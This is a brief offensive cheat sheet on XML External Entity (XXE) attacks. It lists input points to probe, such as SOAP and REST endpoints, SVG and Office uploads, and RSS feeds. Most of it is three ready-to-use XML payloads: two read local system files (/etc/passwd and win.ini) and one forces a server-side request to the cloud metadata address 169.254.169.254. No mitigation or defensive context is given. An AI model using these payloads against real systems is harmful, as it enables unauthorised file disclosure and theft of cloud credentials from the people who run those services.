# XML External Entity (XXE)

> XXE exploits weakly configured XML parsers to read local files, perform SSRF, or achieve RCE.

---

## 🔍 Where to Look for XXE

```
- SOAP web services (XML body)
- REST APIs accepting XML Content-Type
- File uploads (XML-based: docx, xlsx, svg, pdf)
- RSS/Atom feeds
- Any XML input field
- SVG image upload
- Microsoft Office file upload
```

---

## 🧪 Basic XXE Payloads

### Read Local File
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Windows File Read
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><data>&xxe;</data></root>
```

### SSRF via XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
```

